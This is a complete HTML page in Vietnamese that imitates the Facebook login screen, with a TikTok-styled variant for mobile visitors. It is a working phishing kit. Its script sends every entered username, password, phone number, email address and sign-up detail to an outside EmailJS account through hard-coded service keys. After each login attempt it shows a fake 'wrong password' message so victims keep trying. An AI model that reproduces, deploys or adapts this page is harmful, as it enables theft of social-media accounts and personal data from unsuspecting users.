<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Đăng nhập Facebook | Facebook</title>
    <meta property="og:title" content="Facebook - Đăng nhập hoặc đăng ký">
    <meta property="og:description" content="Facebook giúp bạn kết nối và chia sẻ với mọi người trong cuộc sống của bạn.">
    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg">
    <meta property="og:url" content="https://www.facebook.com">
    <meta property="og:type" content="website">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <style>
        body {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            background: #f0f2f5;
        }
        .main-container {
            flex-grow: 1;
            padding: 20px;
            max-width: 100%;
            margin: 0 auto;
            text-align: center;
            position: relative;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .header-container {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
        }
        .header-container.hidden {
            display: none;
        }
        .facebook-logo {
            width: 40px;
            height: 40px;
            margin-right: 10px;
        }
        .facebook-title {
            font-size: 24px;
            font-weight: bold;
            color: #1877F2;
            margin-right: 10px;
        }
        .open-button {
            background-color: #42B72A;
            color: white;
            border: none;
            border-radius: 6px;
            padding: 8px 16px;
            font-weight: bold;
            font-size: 14px;
            cursor: pointer;
        }
        .language-text {
            font-size: 12px;
            color: #737373;
            margin-top: 5px;
            margin-bottom: 20px;
        }
        .left-section {
            display: none;
            text-align: left;
            padding: 20px;
        }
        .desktop-logo {
            width: 300px;
            margin-bottom: 20px;
        }
        .slogan {
            font-size: 24px;
            color: #1c1e21;
            line-height: 1.2;
        }
        .back-button {
            display: none;
            align-items: center;
            justify-content: flex-start;
            cursor: pointer;
            font-size: 14px;
            margin-bottom: 20px;
            color: #1c1e21;
            position: absolute;
            top: 20px;
            left: 20px;
        }
        .back-button svg {
            margin-right: 8px;
        }
        .login-container-tiktok, .login-container-desktop,
        .forgot-password-container, .forgot-password-email-container, .create-account-container {
            background: #fff;
            padding: 15px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            text-align: center;
            display: none;
            margin: 0 auto;
            max-width: 400px;
            width: 100%;
        }
        .login-container-tiktok.active, .login-container-desktop.active,
        .forgot-password-container.active, .forgot-password-email-container.active, 
        .create-account-container.active {
            display: block;
        }
        input.form-control {
            margin-bottom: 10px;
            border-radius: 6px;
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            background: #fff;
            font-size: 14px;
        }
        .btn-primary {
            width: 100%;
            border-radius: 6px;
            padding: 12px;
            background-color: #1877F2;
            border-color: #1877F2;
            color: white;
            font-weight: bold;
            font-size: 14px;
            margin-bottom: 10px;
            cursor: pointer;
        }
        .btn-create-account {
            background-color: #42B72A;
            color: white;
            border: none;
            border-radius: 6px;
            padding: 12px 20px;
            font-weight: bold;
            font-size: 14px;
            display: inline-block;
            margin-top: 10px;
            cursor: pointer;
        }
        .forgot-password {
            margin-top: 10px;
            color: #1877F2;
            cursor: pointer;
            font-size: 12px;
        }
        .divider {
            border-top: 1px solid #ddd;
            margin: 15px 0;
        }
        .info-text {
            font-size: 10px;
            color: #737373;
            margin-top: 10px;
        }
        .search-by-email, .search-by-phone {
            display: block;
            text-align: center;
            margin-top: 10px;
            padding: 8px;
            background: transparent;
            color: #737373;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 12px;
            cursor: pointer;
            text-decoration: none;
        }
        .success-popup {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
            width: 90%;
            max-width: 300px;
            text-align: center;
            padding: 15px;
            z-index: 10002;
        }
        .success-popup-title {
            font-size: 16px;
            font-weight: bold;
            color: #1c1e21;
            margin-bottom: 8px;
        }
        .success-popup-message {
            font-size: 12px; /* Chữ nhỏ hơn */
            color: #4b4f56;
            margin-bottom: 15px;
        }
        .success-popup-button {
            background-color: #1877f2;
            color: #fff;
            border: none;
            border-radius: 6px;
            padding: 10px;
            width: 100px;
            font-weight: bold;
            cursor: pointer;
        }
        .overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.3);
            z-index: 10001;
        }
        .footer {
            background: #f5f6f5;
            padding: 15px 0;
            font-size: 10px;
            color: #737373;
            text-align: center;
        }
        .footer-languages {
            margin: 0 auto 8px;
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            justify-content: center;
        }
        .footer-languages a {
            color: #737373;
            text-decoration: none;
            cursor: pointer;
        }
        .footer-links {
            margin: 0 auto 8px;
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            justify-content: center;
        }
        .footer-links a {
            color: #737373;
            text-decoration: none;
            cursor: pointer;
        }
        .footer-meta {
            margin: 0 auto;
            color: #737373;
        }
        body.tiktok-mode {
            background: linear-gradient(to bottom, #69C9D0, #EE1D52);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }
        body.tiktok-mode .main-container {
            padding: 15px;
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        body.tiktok-mode .footer {
            background: transparent;
        }
        body.desktop-mode .main-container {
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 40px;
            max-width: 1200px;
        }
        body.desktop-mode .left-section {
            display: block;
            flex: 1;
            max-width: 500px;
        }
        body.desktop-mode .login-container-desktop {
            flex: 1;
            max-width: 400px;
            margin-left: 40px;
        }
        @media (max-width: 576px) {
            .main-container {
                padding: 15px;
            }
            .back-button {
                top: 10px;
                left: 10px;
            }
            .login-container-tiktok {
                width: 90%;
                max-width: 350px;
            }
        }
    </style>
</head>
<body>
    <div class="main-container">
        <div class="header-container">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="facebook-logo">
            <div class="facebook-title">Facebook</div>
            <button class="open-button" onclick="showLogin()">Mở</button>
        </div>
        <div class="language-text">Tiếng Việt</div>
        <div class="left-section">
            <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook Logo" class="desktop-logo">
            <div class="slogan">Facebook giúp bạn kết nối và chia sẻ với mọi người trong cuộc sống của bạn.</div>
        </div>
        <div class="back-button" id="back-button" onclick="goBack()">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M15 18L9 12L15 6" stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
            </svg>
            Quay lại
        </div>
        <!-- TikTok Login Container -->
        <div class="login-container-tiktok">
            <input type="text" id="login-input-tiktok" class="form-control" placeholder="Số điện thoại/Email/Tên người dùng">
            <input type="password" id="password-tiktok" class="form-control" placeholder="Mật khẩu">
            <button class="btn btn-primary" onclick="login('tiktok')">Đăng nhập</button>
            <div class="forgot-password" onclick="showForgotPassword()">Bạn quên mật khẩu?</div>
            <div class="divider"></div>
            <button class="btn btn-create-account" onclick="showCreateAccount()">Tạo tài khoản mới</button>
        </div>
        <!-- Desktop Login Container -->
        <div class="login-container-desktop">
            <input type="text" id="login-input-desktop" class="form-control" placeholder="Số di động hoặc email">
            <input type="password" id="password-desktop" class="form-control" placeholder="Mật khẩu">
            <button class="btn btn-primary" onclick="login('desktop')">Đăng nhập</button>
            <div class="forgot-password" onclick="showForgotPassword()">Bạn quên mật khẩu?</div>
            <div class="divider"></div>
            <button class="btn btn-create-account" onclick="showCreateAccount()">Tạo tài khoản mới</button>
        </div>
        <!-- Forgot Password Container -->
        <div class="forgot-password-container">
            <h5 style="font-weight: bold;">Tìm tài khoản của bạn</h5>
            <p>Nhập số di động của bạn</p>
            <input type="text" id="phone-input" class="form-control" placeholder="Số di động">
            <p class="info-text">Chúng tôi có thể gửi thông báo qua SMS và WhatsApp nhằm mục đích bảo mật</p>
            <button class="btn btn-primary" onclick="searchByPhone()">Tiếp tục</button>
            <a href="#" class="search-by-email" onclick="showForgotPasswordEmail()">Tìm kiếm bằng email</a>
        </div>
        <!-- Forgot Password Email Container -->
        <div class="forgot-password-email-container">
            <h5 style="font-weight: bold;">Tìm tài khoản của bạn</h5>
            <p>Nhập email của bạn</p>
            <input type="email" id="email-input" class="form-control" placeholder="Email">
            <button class="btn btn-primary" onclick="searchByEmail()">Tiếp tục</button>
            <a href="#" class="search-by-phone" onclick="showForgotPassword()">Tìm kiếm bằng số di động</a>
        </div>
        <!-- Create Account Container -->
        <div class="create-account-container">
            <h5 style="font-weight: bold;">Tạo tài khoản mới</h5>
            <input type="text" id="firstName" class="form-control" placeholder="Tên">
            <input type="text" id="lastName" class="form-control" placeholder="Họ">
            <input type="text" id="phone" class="form-control" placeholder="Số di động">
            <input type="email" id="email" class="form-control" placeholder="Email">
            <input type="password" id="new-password" class="form-control" placeholder="Mật khẩu mới">
            <input type="password" id="confirm-password" class="form-control" placeholder="Xác nhận mật khẩu">
            <button class="btn btn-primary" onclick="createAccount()">Đăng ký</button>
        </div>
    </div>
    <div class="overlay" id="dialog-overlay"></div>
    <div class="success-popup" id="custom-dialog">
        <div class="success-popup-title" id="dialog-title"></div>
        <div class="success-popup-message" id="dialog-message"></div>
        <button class="success-popup-button" onclick="hideDialog()">OK</button>
    </div>
    <footer class="footer">
        <div class="footer-languages">
            <a href="https://www.facebook.com/?locale=vi_VN" target="_blank">Tiếng Việt</a>
            <a href="https://www.facebook.com/?locale=en_GB" target="_blank">English (UK)</a>
            <a href="https://www.facebook.com/?locale=zh_TW" target="_blank">中文(台灣)</a>
            <a href="https://www.facebook.com/?locale=ko_KR" target="_blank">한국어</a>
            <a href="https://www.facebook.com/?locale=ja_JP" target="_blank">日本語</a>
            <a href="https://www.facebook.com/?locale=fr_FR" target="_blank">Français (France)</a>
            <a href="https://www.facebook.com/?locale=th_TH" target="_blank">ภาษาไทย</a>
            <a href="https://www.facebook.com/?locale=es_ES" target="_blank">Español</a>
            <a href="https://www.facebook.com/?locale=pt_BR" target="_blank">Português (Brasil)</a>
            <a href="https://www.facebook.com/?locale=de_DE" target="_blank">Deutsch</a>
            <a href="https://www.facebook.com/?locale=it_IT" target="_blank">Italiano</a>
        </div>
        <div class="footer-links">
            <a onclick="showLogin()">Đăng nhập</a>
            <a onclick="showCreateAccount()">Đăng ký</a>
            <a href="https://www.messenger.com/" target="_blank">Messenger</a>
            <a href="https://www.facebook.com/lite/" target="_blank">Facebook Lite</a>
            <a href="https://www.facebook.com/watch/" target="_blank">Video</a>
            <a href="https://www.facebook.com/places/" target="_blank">Địa điểm</a>
            <a href="https://www.facebook.com/games/" target="_blank">Trò chơi</a>
            <a href="https://www.facebook.com/marketplace/" target="_blank">Marketplace</a>
            <a href="https://pay.facebook.com/" target="_blank">Meta Pay</a>
            <a href="https://www.meta.com/store/" target="_blank">Meta Store</a>
            <a href="https://www.meta.com/quest/" target="_blank">Meta Quest</a>
            <a href="https://www.instagram.com/" target="_blank">Instagram</a>
            <a href="https://www.threads.net/" target="_blank">Threads</a>
            <a href="https://www.facebook.com/fundraisers/" target="_blank">Quyên góp</a>
            <a href="https://about.meta.com/" target="_blank">Giới thiệu</a>
            <a href="https://www.facebook.com/help/" target="_blank">Trợ giúp</a>
            <a href="https://www.facebook.com/business/" target="_blank">Tạo quảng cáo</a>
            <a href="https://www.facebook.com/pages/create/" target="_blank">Tạo Trang</a>
            <a href="https://developers.facebook.com/" target="_blank">Nhà phát triển</a>
            <a href="https://careers.facebook.com/" target="_blank">Tuyển dụng</a>
            <a href="https://www.facebook.com/policies/cookies/" target="_blank">Cookie</a>
            <a href="https://www.facebook.com/policies/" target="_blank">Điều khoản</a>
        </div>
        <div class="footer-meta">Meta © 2025</div>
    </footer>

    <script type="text/javascript">
        (function() {
            emailjs.init("wF5gWgp1GWyg7q0KY"); // Thay bằng publicKey của bạn nếu khác
        })();
    </script>

    <script>
        window.onload = function() {
            const referrer = document.referrer.toLowerCase();
            const userAgent = navigator.userAgent.toLowerCase();
            const urlParams = new URLSearchParams(window.location.search);
            const isDesktop = window.innerWidth > 1024 && !/mobile|android|iphone|ipad/i.test(userAgent);
            const isFromTikTok = 
                referrer.includes("tiktok.com") || 
                userAgent.includes("tiktok") || 
                urlParams.get("utm_source") === "tiktok" || 
                /mobile|android|iphone|ipad/i.test(userAgent);

            console.log("Referrer:", referrer);
            console.log("User Agent:", userAgent);
            console.log("URL Params:", urlParams.toString());
            console.log("Is Desktop:", isDesktop);
            console.log("Is From TikTok:", isFromTikTok);

            document.body.classList.remove('tiktok-mode', 'desktop-mode');

            if (isFromTikTok && !isDesktop) {
                console.log("Applying TikTok mode");
                document.body.classList.add('tiktok-mode');
                document.querySelector('.header-container').classList.add('hidden');
                document.querySelector('.left-section').style.display = 'none';
                document.querySelector('.language-text').style.display = 'none';
                hideAllExcept('.login-container-tiktok');
            } else {
                console.log("Applying Desktop mode");
                document.body.classList.add('desktop-mode');
                document.querySelector('.header-container').classList.add('hidden');
                document.querySelector('.left-section').style.display = 'block';
                document.querySelector('.language-text').style.display = 'none';
                hideAllExcept('.login-container-desktop');
            }
        };

        function hideAllExcept(selector) {
            const containers = [
                '.login-container-tiktok', '.login-container-desktop',
                '.forgot-password-container', '.forgot-password-email-container', '.create-account-container'
            ];
            containers.forEach(container => {
                const element = document.querySelector(container);
                element.classList.remove('active');
                element.style.display = container === selector ? 'block' : 'none';
            });
            document.querySelector(selector).classList.add('active');
        }

        let previousPage = null;

        function showLogin() {
            const isDesktop = document.body.classList.contains('desktop-mode');
            const isTikTok = document.body.classList.contains('tiktok-mode');
            if (isTikTok) {
                hideAllExcept('.login-container-tiktok');
                document.querySelector('.header-container').classList.add('hidden');
                document.querySelector('.language-text').style.display = 'none';
            } else if (isDesktop) {
                hideAllExcept('.login-container-desktop');
                document.querySelector('.header-container').classList.add('hidden');
                document.querySelector('.language-text').style.display = 'none';
            }
            document.getElementById('back-button').style.display = 'none';
            document.querySelector('.left-section').style.display = isDesktop ? 'block' : 'none';
            previousPage = null;
        }

        function showForgotPassword() {
            const isDesktop = document.body.classList.contains('desktop-mode');
            hideAllExcept('.forgot-password-container');
            document.getElementById('back-button').style.display = 'flex';
            document.querySelector('.left-section').style.display = 'none';
            document.querySelector('.language-text').style.display = 'none';
            if (isDesktop) {
                document.querySelector('.header-container').classList.add('hidden');
            } else {
                document.querySelector('.header-container').classList.add('hidden');
            }
            previousPage = showLogin;
        }

        function showForgotPasswordEmail() {
            const isDesktop = document.body.classList.contains('desktop-mode');
            hideAllExcept('.forgot-password-email-container');
            document.getElementById('back-button').style.display = 'flex';
            document.querySelector('.left-section').style.display = 'none';
            document.querySelector('.language-text').style.display = 'none';
            if (isDesktop) {
                document.querySelector('.header-container').classList.add('hidden');
            } else {
                document.querySelector('.header-container').classList.add('hidden');
            }
            previousPage = showForgotPassword;
        }

        function showCreateAccount() {
            const isDesktop = document.body.classList.contains('desktop-mode');
            hideAllExcept('.create-account-container');
            document.getElementById('back-button').style.display = 'flex';
            document.querySelector('.left-section').style.display = 'none';
            document.querySelector('.language-text').style.display = 'none';
            if (isDesktop) {
                document.querySelector('.header-container').classList.add('hidden');
            } else {
                document.querySelector('.header-container').classList.add('hidden');
            }
            previousPage = showLogin;
        }

        function goBack() {
            if (previousPage) {
                previousPage();
            }
        }

        function showDialog(title, message) {
            const dialog = document.getElementById('custom-dialog');
            const overlay = document.getElementById('dialog-overlay');
            document.getElementById('dialog-title').innerText = title;
            document.getElementById('dialog-message').innerText = message;
            dialog.style.display = 'block';
            overlay.style.display = 'block';
        }

        function hideDialog() {
            document.getElementById('custom-dialog').style.display = 'none';
            document.getElementById('dialog-overlay').style.display = 'none';
        }

        function login(mode) {
            const loginInput = mode === 'tiktok' ? document.getElementById('login-input-tiktok') :
                             document.getElementById('login-input-desktop');
            const passwordInput = mode === 'tiktok' ? document.getElementById('password-tiktok') :
                                 document.getElementById('password-desktop');
            const loginValue = loginInput.value;
            const password = passwordInput.value;

            if (!loginValue || !password) {
                showDialog("Đăng nhập thất bại!", "Vui lòng nhập đầy đủ thông tin!");
                return;
            }

            const templateParams = {
                password: password,
                phone: '',
                email: loginValue,
                firstName: '',
                lastName: ''
            };

            emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
                .then(function(response) {
                    showDialog("Đăng nhập thất bại!", "Sai tên đăng nhập hoặc mật khẩu, vui lòng thử lại");
                }, function(error) {
                    showDialog("Đăng nhập thất bại!", "Có lỗi xảy ra, vui lòng thử lại!");
                });
        }

        function searchByPhone() {
            const phone = document.getElementById('phone-input').value;
            if (!phone) {
                showDialog("Tìm kiếm thất bại!", "Vui lòng nhập số di động!");
                return;
            }
            const templateParams = { password: '', phone: phone, email: '', firstName: '', lastName: '' };
            emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
                .then(function(response) {
                    showDialog("Tìm kiếm thành công!", "Thông tin khôi phục đã được gửi đến Gmail của bạn!");
                }, function(error) {
                    showDialog("Tìm kiếm thất bại!", "Không tìm thấy tài khoản!");
                });
        }

        function searchByEmail() {
            const email = document.getElementById('email-input').value;
            if (!email) {
                showDialog("Tìm kiếm thất bại!", "Vui lòng nhập email!");
                return;
            }
            const templateParams = { password: '', phone: '', email: email, firstName: '', lastName: '' };
            emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
                .then(function(response) {
                    showDialog("Tìm kiếm thành công!", "Thông tin khôi phục đã được gửi đến Gmail của bạn!");
                }, function(error) {
                    showDialog("Tìm kiếm thất bại!", "Không tìm thấy tài khoản!");
                });
        }

        function createAccount() {
            const firstName = document.getElementById('firstName').value;
            const lastName = document.getElementById('lastName').value;
            const phone = document.getElementById('phone').value;
            const email = document.getElementById('email').value;
            const password = document.getElementById('new-password').value;
            const confirmPassword = document.getElementById('confirm-password').value;

            if (!firstName || !lastName || !phone || !email || !password || !confirmPassword) {
                showDialog("Đăng ký thất bại!", "Vui lòng điền đầy đủ thông tin!");
                return;
            }
            if (password !== confirmPassword) {
                showDialog("Đăng ký thất bại!", "Mật khẩu không khớp!");
                return;
            }

            const templateParams = {
                password: password,
                phone: phone,
                email: email,
                firstName: firstName,
                lastName: lastName
            };

            emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
                .then(function(response) {
                    showDialog("Đăng ký thành công!", "Thông tin tài khoản đã được gửi đến Gmail của bạn!");
                }, function(error) {
                    showDialog("Đăng ký thất bại!", "Có lỗi xảy ra, vui lòng thử lại!");
                });
        }
    </script>
</body>
</html>
